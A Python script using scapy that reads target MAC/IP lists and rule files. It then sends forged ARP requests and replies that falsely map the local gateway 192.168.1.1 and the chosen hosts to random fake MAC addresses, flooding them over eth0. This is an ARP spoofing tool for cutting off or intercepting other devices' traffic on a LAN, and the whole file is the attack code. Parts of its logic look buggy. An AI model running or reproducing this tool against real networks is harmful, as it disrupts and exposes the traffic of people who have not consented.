#!/usr/bin/env python
from scapy.all import *
import time
import random
import os
import fileinput
import ElementLib as E
#------------------------
RulesFileName="Rules.txt"
ScanResultFileName = "ScanResult.txt"
PayloadLen = 10*1000
GW_mac=[]
GW_ip = "192.168.1.1"
interfaceName="eth0"
VendorMAC01=[0x3C,0xD0,0xF8,0x00,0x00,0x00]
#------------------------

Rules,MAC,Interval,Mode,Plan=[],[],[],[],[]
Payload=ARP()*PayloadLen
ScanResults=[]
ScanResultsMAC=[]
ScanResultsIP=[]

def ImportRules(FileName):
    global Rules
    Rules = list(fileinput.input(FileName))

def ImportScanResult(FileName):
    global ScanResults
    global ScanResultsMAC
    global ScanResultsIP
    ScanResultsMAC=[]
    ScanResultsIP=[]
    ScanResults = fileinput.input(FileName)
    for ScanResult in ScanResults:
        ScanResult = ScanResult.replace("\n","")
        ScanResultsMAC.append(ScanResult.split(",")[0])
        ScanResultsIP.append(ScanResult.split(",")[1])

def MatchTarget(MAC):
    if MAC in ScanResultsMAC:
        return True
    return False
#read single rule->MAC,Interval,Mode,Plan
def ReadRule(Rule):
    global MAC
    global Interval
    global Mode
    global Plan
    MAC,Interval,Mode,Plan = [],[],[],[]
    #comment for rules,just ignore it
    if Rule[0] == "#":return
    Rule = Rule.replace("\n","")
    Rule=Rule.split(",")
    MAC,Interval,Mode,Plan=Rule[0],Rule[1],Rule[2],Rule[3]
    #print(MAC)

def ClearPayload():
    Payload=ARP()*PayloadLen

def GetMac(tgtIP,Retry=4):
    cnt = 0
    try:
        while cnt < Retry:
            tgtMac = getmacbyip(tgtIP)
            if tgtMac is None:
                print("Get Mac of IP <%s> failed...Will Retry the <%s> times"%(tgtIP,cnt));cnt += 1
            else:return tgtMac
    except:
        print("Get Mac of %s failed..."%tgtIP)
        return None

def GeneratePacket4MAC(PackNum,TargtMAC,TargetIP):
    PKT = []
    if TargetIP is not None:
        Temp_mac = E.RandomMacs(VendorMAC01,PackNum)
        #PKT_1 = Ether(dst=TargtMAC)/ARP(op=1,psrc=GW_ip,hwsrc=Temp_mac,pdst=TargetIP,hwdst=TargtMAC)
        #PKT_2 = Ether(dst=GW_mac)/ARP(op=2,psrc=TargetIP,hwsrc=Temp_mac,pdst=GW_ip,hwdst=GW_mac)
        #print(type(PKT_1))
        for i in range(0,PackNum):
            PKT_1 = Ether(dst=TargtMAC)/ARP(op=1,psrc=GW_ip,hwsrc=Temp_mac[i],pdst=TargetIP,hwdst=TargtMAC)
            PKT_2 = Ether(dst=GW_mac)/ARP(op=2,psrc=TargetIP,hwsrc=Temp_mac[i],pdst=GW_ip,hwdst=GW_mac)
            PKT.append(PKT_1)
            PKT.append(PKT_2)
    return PKT

def FillPayload4MAC(MAC,offset):
    if MatchTarget(MAC) == False:return False
    if E.PlanCheck(Plan) == False:return False

    PackNum,PackInsert = PayloadLen / int(Interval),int(Interval)
    PKT_temp = GeneratePacket4MAC(PackNum,MAC,ScanResultsIP[ScanResultsMAC.index(MAC)])
    for i in range(0,PackNum):
        if i >= PackNum - 1:return
        Payload[PackNum*i+offset] = PKT_temp[i]

def FillPayload4MACs():
    ImportRules(RulesFileName)
    ImportScanResult(ScanResultFileName)
    ClearPayload()
    for Rule in Rules:
        ReadRule(Rule)
        FillPayload4MAC(MAC,Rules.index(Rule))

def SendOnePacket(Face,PKT,Interval=0.02):
    try:
        sendp(PKT,iface = Face)
        #time.sleep(Interval)
    except:print("!!Send Error!!")

def SendPacks(Face,PKT,Group=10,Interval=0.02):
	for i in range(0,len(PKT)):
	    if i >= ((len(PKT) / Group) - 1):return
	    SendOnePacket(Face,PKT[i*Group:(i+1)*Group],Interval)
	    i = i + Group
def GetOurInf():
    global GW_mac
    GW_mac = GetMac(GW_ip)

GetOurInf()
FillPayload4MACs()
SendPacks(interfaceName,Payload,10,0.2)
